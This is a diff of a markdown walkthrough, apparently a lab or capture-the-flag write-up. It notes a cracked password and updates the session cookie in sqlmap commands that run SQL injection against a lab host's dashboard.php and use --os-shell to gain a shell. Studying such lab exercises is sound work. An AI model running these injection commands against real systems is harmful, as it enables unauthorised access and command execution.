@@ -81,13 +81,14 @@ Hashcat cracked the password: qwerty789
 sudo apt install sqlmap
 ```
 #### 6.2 Perform SQL injection
+- Obtain PHPSESSID cookie value from Firefox cookie editor
 - Run sqlmap
 ```bash
-sqlmap -u 'http://10.129.95.174/dashboard.php?search=any+query' --cookie="PHPSESSID=7u6p9qbhb44c5c1rsefp4ro8u1"
+sqlmap -u 'http://10.129.95.174/dashboard.php?search=any+query' --cookie="PHPSESSID=j1uot4n07trl1k8b95mmthoqj1"
 ```
 - Run sqlmap with --os-shell option to obtain shell
 ```bash
-sqlmap -u 'http://10.129.95.174/dashboard.php?search=any+query' --cookie="PHPSESSID=7u6p9qbhb44c5c1rsefp4ro8u1" --os-shell
+sqlmap -u 'http://10.129.95.174/dashboard.php?search=any+query' --cookie="PHPSESSID=j1uot4n07trl1k8b95mmthoqj1" --os-shell
 ```
 - Stabilize the shell
 ```bash
